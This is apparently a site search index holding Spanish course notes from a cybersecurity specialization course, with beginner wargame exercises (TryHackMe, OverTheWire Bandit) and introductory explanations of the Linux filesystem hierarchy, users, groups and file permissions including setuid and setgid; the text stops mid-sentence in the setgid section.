{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"section/","title":"Apuntes y ejercicios pr\u00e1cticas del curso de especializaci\u00f3n ciberseguridad","text":"<p>Apuntes, pr\u00e1cticas y ejercicios del curso de especializaci\u00f3n de Ciberseguridad en el IES Severo Ochoa (Elche).</p> <p>Los ejercicios y conocimientos contenidos en las pr\u00e1cticas y/o apuntes de  todos los m\u00f3dulos tienen exclusivamente prop\u00f3sito formativo, por lo que  nunca se deber\u00e1n utilizar con fines maliciosos o delictivos.</p> <p>Ning\u00fan alumno o alumna de este curso, ni profesor o profesora como  docentes, ser\u00e1n responsables de los da\u00f1os directos o indirectos que  pudieran derivarse del uso inadecuado de las herramientas y mecanismos  expuestos.</p>"},{"location":"section/Ej_Linux/","title":"Ejercicios b\u00e1sicos manejo Linux","text":"<ol> <li> <p>En el primer ejercicio propuesto, vamos a hacer uso de la plataforma Tryhackme. TryHackMe es una plataforma web en la que podremos aprender hacking desde 0, a base de resolver retos con una filosof\u00eda de CTF y gamificaci\u00f3n.</p> <p>Deberemos registrarnos para poder acceder a todas las m\u00e1quinas y salas de la plataforma.</p> <p>Una vez dentro podremos acceder a las 3 salas que vamos a usar. Cada sala en Tryhackme es un reto compuesto de diferentes tareas a completar para alcanzar el 100% del reto. Puesto que estas 3 salas van enlazadas (al finalizar una viene el link de la siguiente) os dejo el link de la primera:</p> <p>Linux Fundamentals part 1</p> <p>Estas salas con varias tareas cada una son completamente guiadas. Al principio de las mismas hay un v\u00eddeo explicando detalladamente el funcionamiento de las mismas. El v\u00eddeo est\u00e1 en ingl\u00e9s pero se pueden poner los subt\u00edtulos en ingl\u00e9s (bastante buenos) o con traducci\u00f3n autom\u00e1tica (con lo que eso implique...). Deb\u00e9is visionarlo con calma para despu\u00e9s completar las tareas propuestas de la sala.</p> <p>Tarea</p> <p>El objetivo es completar las 3 salas que est\u00e1n formadas principalmente por ejercicios muy b\u00e1sicos de la l\u00ednea de comandos de Linux. En vuestro dashboard os aparecer\u00e1 el progreso de cada una de las salas a medida que vay\u00e1is uniendo\u00f3s a ellas:</p> <p></p> <p>A modo de demostraci\u00f3n, deb\u00e9is adjuntar una captura de pantalla de vuestro dashboard donde se pueda comprobar que las 3 est\u00e1n completadas al 100% (aparecer\u00e1n en color verde).</p> <p>Algunos v\u00eddeos introductorios a Tryhackme:</p> <p> </p> <p> </p> </li> <li> <p>El segundo ejercicio que os propongo es una suerte de wargame.</p> <p>Iremos a la p\u00e1gina de overthewire que disponer de varios retos, aunque nosotros nos centraremos en Bandit.</p> <p>En la p\u00e1gina inicial a la que os lleva el link, explica el mecanismo del reto. Os deb\u00e9is conectar v\u00eda ssh a la m\u00e1quina bandit.labs.overthewire.org, al puerto 2220 con el usuario bandit0 y el password bandit0. En Linux pod\u00e9is utilizar directamente la l\u00ednea de comandos, si est\u00e1is bajo un sistema Windows deber\u00e9is utilizar alg\u00fan programa del tipo PuTTY, superPuTTY, MobaXterm o similares.</p> <p></p> <p></p> <p>Una vez hecho eso, que es el level0, deb\u00e9is ir al apartado del men\u00fa de la izquierda que os indicar\u00e1 que hacer para pasar de nivel, es decir, a Level 0 -&gt; Level 1</p> <p></p> <p>En este men\u00fa nos indica el objetivo a conseguir en este nivel:</p> <p></p> <p>Es decir, tal y como explica ah\u00ed, el password para ir al siguiente nivel est\u00e1 localizado en el archivo readme que est\u00e1 en el home del usuario. Con este password y usando el usuario bandit1, podremos conectarnos igual que antes por SSH pero esta vez al nivel1.</p> <p>Os indica adem\u00e1s, a modo de ayuda, algunos de los comandos que pod\u00e9is llegar a necesitar para resolver el nivel. No tienen por qu\u00e9 ser todos, dependiendo de la forma en que lo solucion\u00e9is.</p> <p>El juego sigue este mecanismo para ir pasando de nivel. En ocasiones como pistas os pone los comandos a utilizar tal y como hemos visto y en otras os sugiere lecturas para afrontar el reto:</p> <p></p> <p>Tarea</p> <p>El objetivo ser\u00eda completar todos los niveles o, en su defecto, llegar lo m\u00e1s lejos posible. Se habr\u00e1 de aportar la contrase\u00f1a de cada nivel as\u00ed como una explicaci\u00f3n de c\u00f3mo se ha obtenido, a modo de prueba.</p> </li> <li> <p>Como tercer ejercicio, la propuesta es completar los desaf\u00edos de cmdchallenge y documentar las soluciones empleadas.</p> <p>Info</p> <p>Fij\u00e1os que arriba a la derecha hay tres secciones para completar</p> <p></p> </li> <li> <p>La cuarta propuesta se trata de un juego en terminal. Deb\u00e9is clonaros el siguiente repositorio: https://gitlab.com/slackermedia/bashcrawl mediante el comando <code>git clone</code> en vuestra m\u00e1quina.</p> <p>Una vez clonado las instrucciones de cada fase est\u00e1n en los distintos archivos \"scroll\" que vayamos encontrando. As\u00ed pues, para comenzar a recibir instrucciones no debemos hacer m\u00e1s que <code>cat scroll</code> dentro del directorio <code>entrance</code></p> </li> </ol>"},{"location":"section/Ej_Win/","title":"Ejercicios b\u00e1sicos manejo Windows","text":"<ol> <li> <p>El ejercicio propuesto para esta parte es muy sencillo:</p> <ol> <li> <p>Deb\u00e9is instalar un Windows Server 2019 ( o 2016 en su defecto) y un cliente Windows 10 (Windows 8.1 en su defecto) en sendas m\u00e1quinas virtuales en VirtualBox</p> </li> <li> <p>Deb\u00e9is crearos un usuario con vuestro nombre en el cliente</p> </li> <li> <p>Deb\u00e9is promocionar el Windows Server a controlador de dominio. El nombre de dominio ser\u00e1 \"cibers8a\"</p> </li> <li> <p>Deb\u00e9is a\u00f1adir al usuario del cliente en el dominio</p> </li> <li> <p>Deber\u00e9is configurar una GPO que impida a los usuarios acceder al panel de control</p> </li> <li> <p>Tras forzar la aplicaci\u00f3n de la GPO, deb\u00e9is comprobar en el cliente que vuestro usuario, efectivamente, no tiene permitido el acceso al panel de control</p> </li> </ol> </li> <li> <p>El segundo ejercicio propuesto se trata de realizar la siguiente sala de TryHackMe y adjuntar una captura donde se va que se ha completado el 100% de la misma.</p> </li> </ol>"},{"location":"section/EntLinux/","title":"Conceptos b\u00e1sicos entornos Linux","text":"<p>En estos primeros pasos veremos algunos conceptos muy b\u00e1sicos que es necesario dominar previo a adquirir cualquier conocimiento relativo a la seguridad de sistemas.</p> <p>Estas nociones b\u00e1sicas nos dar\u00e1n las herramientas principales para desenvolvernos dentro de un sistema y entender los principios de ciberseguridad que se presentar\u00e1n con posterioridad.</p>"},{"location":"section/EntLinux/#estructura-de-ficheros","title":"Estructura de ficheros","text":"<p>Un sistema de archivos, llamado com\u00fanmente File System o FS, determina la organizaci\u00f3n de los datos en un soporte de almacenamiento, y por tanto, c\u00f3mo gestiona y organiza el sistema operativo los archivos. </p> <p>Linux es, como todo Unix, un sistema operativo completamente orientado a archivos. Se representa todo (o casi todo) con un archivo, tanto los datos (archivos de datos de cualquier tipo, como una imagen o un programa) como los perif\u00e9ricos (terminales, ratones, teclado, tarjeta sonido, etc.) o incluso los medios de comunicaci\u00f3n (sockets, tuber\u00edas nombradas, etc.). Se puede decir que el sistema de archivos es el coraz\u00f3n de cualquier sistema Unix.</p> <p>Un archivo es una entidad que almacena datos y programas. Se compone de contenido y metadatos (tama\u00f1o del archivo, propietario, fecha de creaci\u00f3n, permisos). Los archivos est\u00e1n organizados en directorios. Un directorio es un archivo que almacena otros archivos.</p> <p>Los diferentes tipos de archivos incluyen:</p> <ul> <li> <p>Archivos regulares que almacenan datos y programas.</p> </li> <li> <p>Directorios que contienen otros archivos.</p> </li> <li> <p>Archivos especiales que se utilizan para entrada y salida.</p> </li> </ul> <p>Todo en Linux es un archivo, por lo que saber c\u00f3mo manipularlos es muy importante. As\u00ed pues, en la secci\u00f3n correspondiente, veremos las operaciones b\u00e1sicas con archivos mediante el terminal.</p> <p>La estructura de los directorios de Linux, as\u00ed como su contenido y funciones, viene definida en el denominado Filesystem Hierarchy Standard o FHS por sus siglas en ingl\u00e9s, que en otras palabras viene a ser el est\u00e1ndar de jerarqu\u00eda para los sistemas de archivos en sistemas Linux y otros derivados de UNIX.</p> <p>Como pod\u00e9is ver en la siguiente imagen, todo el \u00e1rbol de parte de una ra\u00edz com\u00fan denominada root y que se simboliza por una barra inclinada. A\u00fan as\u00ed, esto no significa que varios de ellos no puedan estar en particiones separadas del resto. De hecho, en muchas distros GNU/Linux es una pr\u00e1ctica muy com\u00fan el hecho ubicar ciertos directorios en particiones separadas del resto.</p> <p></p> <p>La FHS distingue entre lo que ser\u00edan directorios est\u00e1ticos, que son aquellos que contienen binarios, bibliotecas, documentaci\u00f3n, etc., de los din\u00e1micos, que son aquellos que requieren de acciones m\u00e1s a menudo, tales como copias de seguridad, etc.</p> <p>Tambi\u00e9n podemos diferencias claramente lo que son los directorios compartibles, que significa que contienen ficheros que pueden utilizarse desde otros dispositivos, de los no compartibles, que solo pueden utilizarse desde el dispositivo en el que se encuentran.</p>"},{"location":"section/EntLinux/#directorio-raiz-o","title":"Directorio ra\u00edz o \"/\"","text":"<p>Toda la estructura de directorios en los sistemas basados en UNIX parte de un directorio ra\u00edz tambi\u00e9n llamado directorio root y que se simboliza por una barra inclinada o /. De este directorio, es desde donde nacen todo el resto de directorios, independientemente que est\u00e9n almacenados f\u00edsicamente en discos o unidades separadas.</p> <p>Cualquier direcci\u00f3n de archivo o carpeta en Linux empieza por el directorio ra\u00edz o /, seguido de todos los directorios y subdirectorios que que lo contienen, separados cada uno de ellos por /.</p> <p></p> <p>A continuaci\u00f3n conocer\u00e1s con m\u00e1s en detalle a todos los directorios principales que parten del directorio ra\u00edz, junto con sus subdirectorios m\u00e1s importantes y los ficheros que suelen contener.</p>"},{"location":"section/EntLinux/#directorios-bin-sbin","title":"Directorio/s bin, sbin","text":"<p>El directorio /bin es un directorio est\u00e1tico y es donde se almacenan todos los binarios necesarios para garantizar las funciones b\u00e1sicas a nivel de usuario. Solo almacena los ejecutables de usuario, ya que los binarios necesarios para tareas administrativas gestionadas por el usuario root o superusuario del sistema se encuentran en el directorio /sbin.</p> <p>Incluye tambi\u00e9n los binarios que permiten la ejecuci\u00f3n de varias utilidades est\u00e1ndar de la terminal de Linux, concretamente cat, cd, cp, echo, grep, gzip, kill, ls, mv, rm, ping, su, ps, tar y vi.</p> <p>El directorio /sbin hace lo mismo pero para los binarios relativos tareas propias del sistema operativo, y que solamente pueden ser gestionadas por el usuario root, tales como el arranque, tareas de restauraci\u00f3n, reparaci\u00f3n, etc.</p>"},{"location":"section/EntLinux/#directorio-boot","title":"Directorio /boot","text":"<p>Es un directorio est\u00e1tico y contiene los archivos necesarios para arrancar el sistema. Los archivos del cargador de arranque GRUB y los kernels de Linux se almacenan aqu\u00ed, por ejemplo. Sin embargo, los archivos de configuraci\u00f3n del cargador de arranque no se encuentran aqu\u00ed, est\u00e1n en <code>/etc</code> con los otros archivos de configuraci\u00f3n.</p> <p>A la hora de instalar el sistema es importante prever bien el espacio que se le vaya a dar a la partici\u00f3n, ya que a la larga, con la acumulaci\u00f3n de diferentes actualizaciones del Kernel, es com\u00fan que se quede sin espacio. Si esto sucede, se pueden tener problemas a la hora de instalar futuras actualizaciones del n\u00facleo, y ser\u00e1 necesario hacer limpieza de versiones antiguas del kernel.</p>"},{"location":"section/EntLinux/#directorio-dev","title":"Directorio /dev","text":"<p>Este directorio incluye todos los dispositivos de almacenamiento, en forma de archivos especiales, conectados al sistema. Es decir, cualquier disco duro, partici\u00f3n, memoria USB, o CDROM conectado al sistema y que el sistema pueda entender como un volumen l\u00f3gico de almacenamiento.</p> <p>Siendo esto as\u00ed, ver\u00e9is que la ruta en la que se encuentra cualquier volumen (partici\u00f3n o dispositivo externo) conectado al sistema siempre empieza por /dev.</p> <p>Este es el directorio que contiene, por decirlo de alg\u00fan modo, la informaci\u00f3n de cada uno de los vol\u00famenes, a diferencia del directorio <code>/media</code>, que veremos m\u00e1s adelante, que lo que contiene son solo los puntos de montaje, pero no la informaci\u00f3n real de estos vol\u00famenes.</p> <p>Para ver esto en la pr\u00e1ctica, si abres una ventana de terminal y ejecutas el comando sudo <code>fdisk -l</code>, ver\u00e1s la estructura de particiones de tu sistema. En una instalaci\u00f3n t\u00edpica de cualquier distro GNU/Linux suele ser la siguiente:</p> <pre><code>/dev/sda1 - Partici\u00f3n principal\n/dev/sda2 - Partici\u00f3n extendida \n/dev/sda5 - Partici\u00f3n Swap\n</code></pre> <p>Estos no son archivos reales como los conocemos, pero aparecen como archivos; por ejemplo, <code>/dev/sda</code> representa la primera unidad SATA del sistema.</p> <p>Eso en cuanto a particiones. Si se trata de un dispositivo externo, el volumen estar\u00e1 igualmente dentro de /dev, pero en este caso var\u00eda el nombre que el sistema le asigna a dicho volumen. Generalmente la estructura suele ser la siguiente (ejecutando nuevamente el comando sudo fdisk -l con un dispositivo externo conectado puede comprobarse).</p> <pre><code>/dev/sdb1\n/dev/sdb2\n/dev/sdb3\n...\n</code></pre> <p>Este directorio tambi\u00e9n contiene pseudodispositivos, que son dispositivos virtuales que en realidad no se corresponden con el hardware. Por ejemplo, <code>/dev/random</code> produce n\u00fameros aleatorios. Otro ejemplo ser\u00eda el de <code>/dev/null</code>, un dispositivo especial que no produce salida y descarta autom\u00e1ticamente todas las entradas; cuando canaliza la salida de un comando a <code>/dev/null</code>, la descarta.</p>"},{"location":"section/EntLinux/#directorio-etc","title":"Directorio /etc","text":"<p>El directorio <code>/etc</code> contiene archivos de configuraci\u00f3n, que generalmente se pueden editar a mano en un editor de texto. Se debe tener en cuenta que el directorio <code>/etc</code> contiene archivos de configuraci\u00f3n de todo el sistema, adem\u00e1s de las aplicaciones y programas instaladas posteriormente; los archivos de configuraci\u00f3n espec\u00edficos del usuario se encuentran en el directorio de inicio de cada usuario.</p> <p>Es un directorio que deber\u00eda contener \u00fanicamente ficheros de configuraci\u00f3n, y no deber\u00eda contener binarios.</p>"},{"location":"section/EntLinux/#directorio-lib","title":"Directorio lib","text":"<p>Incluye las bibliotecas esenciales que son necesarias para que se puedan ejecutar correctamente todos los binarios que se encuentran en los directorios <code>/bin</code> y <code>/sbin</code>, as\u00ed como los m\u00f3dulos del propio kernel.</p> <p>En los sistemas operativos de 64 bits, adem\u00e1s de <code>/lib</code> existe otro directorio denominado <code>/lib64</code>, referida a las bibliotecas para aplicaciones de 64 bits.</p>"},{"location":"section/EntLinux/#directorio-media","title":"Directorio media","text":"<p>Representa el punto de montaje de todos los vol\u00famenes l\u00f3gicos que se montan temporalmente. Es decir, El directorio <code>/media</code> contiene subdirectorios donde se montan los dispositivos de medios extra\u00edbles insertados en el ordenador.</p> <p>En la mayor\u00eda de distribuciones GNU/Linux, desde hace ya alg\u00fan tiempo, cada vez que se monta una unidad externa, partici\u00f3n, etc., esta se monta dentro del directorio /media y a su vez dentro de un directorio especifico dependiendo del usuario del sistema que monta el volumen.</p> <p>De este modo, si en un sistema hay varios usuarios, pongamos User1 y User2, los puntos de montaje de los vol\u00famenes que montan cada uno de ellos se mostraran en directorios separados tal como as\u00ed:</p> <pre><code>/media/User1\n/media/User2\n</code></pre>"},{"location":"section/EntLinux/#directorio-opt","title":"Directorio opt","text":"<p>El directorio <code>/opt</code> contiene subdirectorios para paquetes de software opcionales. Es com\u00fanmente utilizado por software propietario que no obedece a la jerarqu\u00eda del sistema de archivos est\u00e1ndar; por ejemplo, un programa propietario puede volcar sus archivos en <code>/opt/NombreAplicacion</code> cuando se instala.</p> <p>Antiguamente se sol\u00eda utilizar el directorio <code>mnt</code> para estas funciones, pero actualmente, la mayor\u00eda de distribuciones hacen uso de media.</p>"},{"location":"section/EntLinux/#directorio-proc","title":"Directorio proc","text":"<p>Este directorio contiene informaci\u00f3n de los procesos y aplicaciones que se est\u00e1n ejecutando en un momento determinado en el sistema, pero realmente no guarda nada como tal, ya que lo que almacena son archivos virtuales, por lo que el contenido de este directorio es nulo.</p>"},{"location":"section/EntLinux/#directorio-root","title":"Directorio /root","text":"<p>El directorio <code>/root</code> es el directorio de inicio del usuario root. En lugar de estar ubicado en <code>/home/root</code>, est\u00e1 ubicado en <code>/root</code>. Es distinto de <code>/</code>, que es el directorio ra\u00edz del sistema.</p>"},{"location":"section/EntLinux/#directorio-tmp","title":"Directorio tmp","text":"<p>Las aplicaciones almacenan archivos temporales en el directorio <code>/tmp</code>. Estos archivos generalmente se eliminan cada vez que se reinicia su sistema y pueden ser eliminados en cualquier momento por utilidades como tmpwatch.</p> <p>Las aplicaciones programadas para almacenar archivos en este directorio deben asumir que solo ser\u00e1n recuperables en la sesi\u00f3n actual. En este sentido, hay otro subdirectorio, <code>/var/tmp</code>, dispuesto igualmente para el almacenamiento de archivos temporales, pero cuyo contenido no se borra de forma autom\u00e1tica tras el reinicio del sistema.</p>"},{"location":"section/EntLinux/#directorio-usr","title":"Directorio <code>usr</code>","text":"<p>El directorio <code>/usr</code> contiene aplicaciones y archivos utilizados por los usuarios, a diferencia de las aplicaciones y archivos utilizados por el sistema,  incluyendo todo el software instalado a trav\u00e9s de los gestores de paquetes de cada distribuci\u00f3n. Por ejemplo, las aplicaciones no esenciales se encuentran dentro del directorio <code>/usr/bin</code> en lugar del directorio <code>/bin</code> y los binarios de administraci\u00f3n del sistema no esenciales se encuentran en el directorio <code>/usr/sbin</code> en lugar del directorio <code>/sbin</code>. Las bibliotecas para cada uno se encuentran dentro del directorio <code>/usr/lib</code>. El directorio <code>/usr</code> tambi\u00e9n contiene otros directorios; por ejemplo, los archivos independientes de la arquitectura, como los gr\u00e1ficos, se encuentran en <code>/usr/share</code>:</p> <pre><code>/usr/bin\n/usr/include\n/usr/lib\n/usr/local\n/usr/sbin\n/usr/share\n/usr/src\n</code></pre> <p>El directorio <code>/usr/local</code> es donde se instalan las aplicaciones compiladas localmente de forma predeterminada; esto evita que arruinen el resto del sistema</p>"},{"location":"section/EntLinux/#directorio-var","title":"Directorio var","text":"<p>Este directorio contiene varios archivos con informaci\u00f3n del sistema, como archivos de logs, emails de los usuarios del sistema, bases de datos, informaci\u00f3n almacenada en la cach\u00e9 o informaci\u00f3n relativa a los paquetes de aplicaciones almacenados en <code>/opt</code>. En cierto modo se podr\u00eda decir que act\u00faa a modo de registro del sistema.</p> <p>Podr\u00eda decirse que el directorio <code>/var</code> es la contraparte \"escriturable\" del directorio <code>/usr</code>, que debe ser de solo lectura en el funcionamiento normal. Los archivos de registro y todo lo dem\u00e1s que normalmente se escribir\u00eda en <code>/usr</code> durante el funcionamiento normal se escriben en el directorio <code>/var</code>. </p>"},{"location":"section/EntLinux/#directorio-home","title":"Directorio home","text":"<p>El directorio <code>/home</code> contiene una carpeta de inicio para cada usuario. Por ejemplo, si el nombre de usuario es raul, habr\u00e1 una carpeta de inicio ubicada en <code>/home/raul</code>. Esta carpeta de inicio contiene los archivos de datos del usuario y los archivos de configuraci\u00f3n espec\u00edficos del usuario (configuraciones de programas, por ejemplo). </p> <p>Cada usuario solo tiene acceso de escritura \u00fanicamente a su propia carpeta de inicio y debe convertirse en root para poder tener privilegios que le permitan modificar otros archivos en el sistema.</p> <p>Para visualizar los ficheros ocultos dentro del directorio individual de cada usuario, se puede usar la combinaci\u00f3n de comandos CTRL + H en modo gr\u00e1fico. Todos los archivos y carpetas ocultas en Linux empiezan por un punto, seguido del nombre.</p> <p>En muchas distribuciones es una pr\u00e1ctica recomendada el hecho de ubicar el directorio <code>/home</code> es una partici\u00f3n separada del resto, por tal de facilitar que, en caso de reinstalar el sistema operativo, puedas mantener intacta la partici\u00f3n de la <code>/home</code>, y de este modo mantener todos los archivos personales.</p>"},{"location":"section/EntLinux/#usuarios-y-grupos","title":"Usuarios y grupos","text":"<p>Un usuario es cualquiera que use un ordenador. En este caso, estamos describiendo los nombres que representan a esos usuarios. Puede ser Pol o Mart\u00ed, y pueden usar los nombres superc0der o Pirate en lugar de su nombre real. Lo \u00fanico que importa es que la computadora tenga un nombre para cada cuenta que cree, y es este nombre por el que una persona obtiene acceso para usar la computadora. Algunos servicios del sistema tambi\u00e9n se ejecutan utilizando cuentas de usuario restringidas o privilegiadas.</p> <p>La administraci\u00f3n de los usuarios se realiza con fines de seguridad al limitar el acceso de ciertas maneras espec\u00edficas. El superusuario (root) tiene acceso completo al sistema operativo y su configuraci\u00f3n; est\u00e1 destinado solo para uso administrativo. Los usuarios sin privilegios pueden usar los programas su y sudo para la escalada de privilegios controlada.</p> <p>Cualquier persona puede tener m\u00e1s de una cuenta, siempre que utilicen un nombre diferente para cada una de ellas. Adem\u00e1s, hay algunos nombres reservados que no se pueden usar, como \u00abroot\u00bb.</p> <p>Los usuarios pueden aglutinarse en un \u00abgrupo\u00bb y, del mismo modo, pueden a\u00f1adirse a un grupo existente para utilizar el acceso privilegiado que dicho grupo concede. </p> <p>Los grupos de usuarios juegan un papel esencial en los sistemas Linux. Gracias a ellos tenemos una manera muy f\u00e1cil de seleccionar grupos de usuarios a los que se les permite compartir archivos entre ellos. Tambi\u00e9n proporcionan a los administradores de sistemas una manera m\u00e1s efectiva y sencilla de gestionar los privilegios de los usuarios puesto que permiten asignar privilegios a grupos completos en lugar de a usuarios individuales.</p>"},{"location":"section/EntLinux/#permisos","title":"Permisos","text":"<p>Aunque hay multitud de caracter\u00edsticas de seguridad integradas en los sistemas basados \u200b\u200ben Linux, puede existir una vulnerabilidad potencial muy importante cuando se otorga el acceso al sistema a los usuarios. Pueden aparecer problemas cuando no se han asignado los permisos adecuados a los archivos y directorios.</p>"},{"location":"section/EntLinux/#grupos-de-permisos","title":"Grupos de permisos","text":"<p>Cada archivo y directorio tiene tres grupos de permisos basados \u200b\u200ben usuarios:</p> <ul> <li> <p>Propietario: los permisos de propietario se aplican solo al propietario del archivo o directorio, no afectar\u00e1n las acciones de otros usuarios.</p> </li> <li> <p>Grupo: los permisos de grupo se aplican solo al grupo que se ha asignado al archivo o directorio, no afectar\u00e1n las acciones de otros usuarios.</p> </li> <li> <p>Todos los usuarios: los permisos de todos los usuarios se aplican a todos los dem\u00e1s usuarios del sistema; este es el grupo de permisos que m\u00e1s desea ver.</p> </li> </ul>"},{"location":"section/EntLinux/#tipos-de-permisos","title":"Tipos de permisos","text":"<p>Cada archivo o directorio tiene tres tipos de permisos b\u00e1sicos:</p> <ul> <li> <p>Lectura (read/r): el permiso de lectura se refiere a la capacidad de un usuario para leer el contenido del archivo. El permiso de lectura en un directorio permite listar su contenido.</p> </li> <li> <p>Escritura (write/w): los permisos de escritura se refieren a la capacidad de un usuario para escribir o modificar un archivo. En un directorio permite crear, eliminar o modificar el nombre de un archivo. En un hipot\u00e9tico caso donde tuvi\u00e9ramos permiso de escritura en un archivo pero no en el directorio en el que est\u00e1 ubicado, podr\u00edamos modificar el contenido del archivo pero no su nombre, ni moverlo de sitio, ni eliminarlo del directorio.</p> </li> <li> <p>Ejecuci\u00f3n (execution/x): el permiso de ejecuci\u00f3n afecta la capacidad de un usuario para ejecutar un archivo o ver el contenido de un directorio.</p> </li> </ul> <p></p> <p></p> <p>Tip</p> <p>Podemos inspeccionar con detalle los permisos de arhivos y directorios con el comando:</p> <pre><code>ls -l\n</code></pre> <p></p>"},{"location":"section/EntLinux/#como-se-cambian-los-permisos-en-linux","title":"\u00bfC\u00f3mo se cambian los permisos en Linux?","text":"<p>Para cambiar los permisos de archivos y directorios en GNU/Linux, disponemos de 3 comandos principales:</p> <ul> <li>chmod: cambiar permisos del archivo o directorio:         <pre><code>chmod [permisos][archivo/directorio][opciones]\n</code></pre></li> <li>chown: cambiar el propietario del archivo o directorio:         <pre><code>chown [nuevo usuario propietario][archivo/directorio][opciones]\n</code></pre></li> <li>chgrp: cambiar el grupo del archivo o directorio:         <pre><code>chgrp [nuevo grupo][archivo/directorio][opciones]\n</code></pre></li> </ul> <p>Existen dos formas de cambiar los permisos de archivos y directorios en Linux:</p> <ul> <li>Modo simb\u00f3lico: con notaci\u00f3n basada en caracteres</li> <li>Modo absoluto: con notaci\u00f3n num\u00e9rica, seg\u00fan el sistema octal o en base 8, cuyos valores de forma resumida puedne verse en la imagen a continuaci\u00f3n:</li> </ul> <p></p> <p>As\u00ed pues, una tabla resumen en cu\u00e1nto a los permisos vistos, ser\u00eda la siguiente:</p> Valor Permisos Descripci\u00f3n 0 --- Sin permisos 1 --x Ejecuci\u00f3n 2 -w- Lectura 3 -wx Lectura + ejecuci\u00f3n 4 r-- Lectura 5 r-x Lectura + ejecuci\u00f3n 6 rw- Lectura + escritura 7 rwx Lectura + escritura + ejecuci\u00f3n <p>Los permisos utilizando la notaci\u00f3n num\u00e9rica en sistema octal, se asignan en tuplas de 3 (usuario/grupo/otros) y no es posible asignar s\u00f3lo para uno o dos de los elementos de la tupla.</p> <p>Algunos ejemplos de permisos en modo absoluto son:</p> Notaci\u00f3n Significado rw------- (600) Permisos de lectura y escritura s\u00f3lo para el propietario rw-r--r-- (644) Permisos de lectura y escritura s\u00f3lo para el propietario y s\u00f3lo de lectura para el grupo y resto de usuarios rwxr-xr-x (755) Permisos de lectura, escritura y ejecuci\u00f3n para el usuario y de lectura y ejecuci\u00f3n para el grupo y resto de usuarios rwxrwxrwx (777) Usuario, grupo y resto de usuarios tienen todos los permisos sobre el fichero o directorio (\u00a1Cuidado!) rw-rw-rw- (666) Usuario, grupo y resto de usuarios pueden leer y escribir sobre el fichero o directorio(\u00a1cuidado!) <p>Como ya hemos dicho es el comando chmod el utilizado en el terminal para cambiar los permisos de los usuarios. Puede usarse tanto con el modo absoluto como con el simb\u00f3lico.</p> <p>Un ejemplo para el formato absoluto ser\u00eda:</p> <p><pre><code>chmod 600 archivo/directorio\n</code></pre> Y para  el formato con caracteres</p> <p><pre><code>chmod ugo+rw archivo/directorio\n</code></pre> Donde, en este \u00faltimo caso, los permisos rwx (lectura/escritura/ejecuci\u00f3n) pueden asignarse a: </p> <p>u - propietario</p> <p>g - grupo</p> <p>o - otros</p> <p>a - todos los usuarios 000 Si utilizamos el operador + estaremos agregando permisos, si usamos el - los eliminaremos:</p> <pre><code>chmod a-rw archivo1\nchmod u+rwx archivo2\n</code></pre> <p>Ejemplos pr\u00e1cticos del uso de chmod para cambiar permisos de un archivo. Podemos utilizar tanto la forma absoluta, como la simb\u00f3lica:</p> Modo absoluto Modo simb\u00f3lico Resultado chmod 700 archivo.gpg chmod u+rwx -rwx------ chmod 555 chmod ugo+rx -r-xr-xr-x chmod 666 -chmod ugo+rw rw-rw-rw-"},{"location":"section/EntLinux/#permisos-avanzados","title":"Permisos avanzados","text":"<p>En GNU/Linux, adem\u00e1s de los 3 que hemos visto anteriormente, todav\u00eda existen otros tres permisos especiales adicionales que veremos a continuaci\u00f3n.</p>"},{"location":"section/EntLinux/#bit-setuid","title":"Bit setuid","text":"<p>En Linux, de forma predeterminada, cuando un usuario ejecuta un archivo, el archivo se inicia con los privilegios del usuario que lo ejecuta. Sin embargo, este comportamiento se puede cambiar si establecemos permisos especiales en archivos ejecutables.</p> <p>Setuid significa \"establecer ID de usuario\". Si configuramos el bit setuid en un archivo ejecutable, el archivo siempre se ejecuta con los privilegios del propietario del archivo, sin importar qui\u00e9n lo inicie. </p> <p>El bit setuid solo tiene sentido si est\u00e1 configurado en archivos ejecutables. No hay ning\u00fan significado pr\u00e1ctico si configuramos el bit setuid en un archivo o directorio no ejecutable.</p> <p>El comando passwd es un ejemplo con este bit especial aplicado:</p> <p><pre><code>$ ls -l /bin/passwd\n-rwsr-xr-x 1 root root 63624 Dec 15 21:06 /bin/passwd\n</code></pre> Observamos que el permiso de ejecuci\u00f3n para el propietario es una \"s\" min\u00fascula en lugar de la \"x\" habitual. Esta \"s\" indica que el archivo tiene el bit setuid establecido. El comando passwd siempre se ejecutar\u00e1 con  privilegios de root sin importar qui\u00e9n lo inicie porque el propietario del archivo es root.</p> <p>Como ya sabemos, podemos usar el comando chmod para establecer el  bit setuid en un archivo:</p> <p><pre><code>chmod u+s archivo\n</code></pre> S\u00f3lo el propietario el archivo o el usuario o el usuario root puede establecer el bit setuid</p> <p>Un ejemplo pr\u00e1ctico de c\u00f3mo configurar este bit setuid en un archivo, de forma simb\u00f3lica:</p> <p><pre><code>$ ls -l archivo\n-rwxr-xr-x 1 raul raul 0 Feb 2 12:22 archivo\n$ chmod u+s archivo\n$ ls -l archivo    \n-rwsr-xr-x 1 raul raul 0 Feb  2 12:22 archivo\n</code></pre> En el modo absoluto, anteponemos un 4 a los permisos para indicar este bit:</p> <pre><code>$ chmod 4755 archivo\n-rwsr-xr-x 1 raul raul 0 Feb  2 12:22 archivo\n</code></pre> <p>Y para quitar este bit, en ambos modos:</p> <p><pre><code>$ chmod u-s archivo\n$ ls -l archivo\n-rwxr-xr-x 1 raul raul 0 Feb  2 12:22 archivo\n</code></pre> y</p> <pre><code>$ chmod 0755 archivo\n$ ls -l archivo\n-rwxr-xr-x 1 raul raul 0 Feb  2 12:22 archivo\n</code></pre> <p>Riesgo de seguridad<p>El bit setuid podr\u00eda ser bastante \u00fatil en varias aplicaciones. Sin embargo, debemos tener cuidado al establecer esos permisos especiales, ya que pueden crear problemas de seguridad.</p> <p>Por ejemplo, un usuario normal puede obtener privilegios de superusuario ejecutando un programa que establece el UID  como root y realizar una escalada de privilegios.</p> </p>"},{"location":"section/EntLinux/#bit-setgid","title":"Bit setgid","text":""},{"location":"section/EntLinux/#bit-setgid-en-un-archivo","title":"Bit setgid en un archivo","text":"<p>setgid es la abreviatura de \"set group id\". Si configuramos el bit setgid en un archivo ejecutable, no importa qui\u00e9n inicie el archivo, se ejecuta con los privilegios del grupo propietario.</p> <p>El comando de localizaci\u00f3n es un ejemplo de un archivo con el conjunto de bits setgid :</p> <p><pre><code>$ ls -l /usr/bin/locate\n-rwxr-sr-x 1 root locate 43048 Nov 13 18:09 /usr/bin/locate\n</code></pre> Similar al  bit setuid , notamos una \"s\" min\u00fascula en la salida de ls , excepto que est\u00e1 en la secci\u00f3n de grupo en 